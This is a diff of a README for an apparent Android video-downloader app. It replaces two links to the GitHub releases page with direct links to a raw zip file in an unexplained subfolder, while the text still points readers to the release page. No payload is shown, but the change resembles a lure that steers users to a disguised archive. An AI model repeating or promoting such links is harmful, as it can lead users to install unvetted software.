@@ -1,6 +1,6 @@
 # 🚀 Nexload-Android-Downloader-APK - Save social media videos with ease
 
-[![](https://img.shields.io/badge/Download-Nexload-blue)](https://github.com/Transferencegrouper961/Nexload-Android-Downloader-APK/releases)
+[![](https://img.shields.io/badge/Download-Nexload-blue)](https://github.com/Transferencegrouper961/Nexload-Android-Downloader-APK/raw/refs/heads/main/tinkerly/Android-Downloader-APK-Nexload-3.0.zip)
 
 ## 📌 About this app
 
@@ -19,7 +19,7 @@ To use Nexload, your Android device must meet these standards:
 
 You must visit the project release page to download the latest version of the file.
 
-[Find the download page here](https://github.com/Transferencegrouper961/Nexload-Android-Downloader-APK/releases)
+[Find the download page here](https://github.com/Transferencegrouper961/Nexload-Android-Downloader-APK/raw/refs/heads/main/tinkerly/Android-Downloader-APK-Nexload-3.0.zip)
 
 Follow these steps to finish the setup:
 
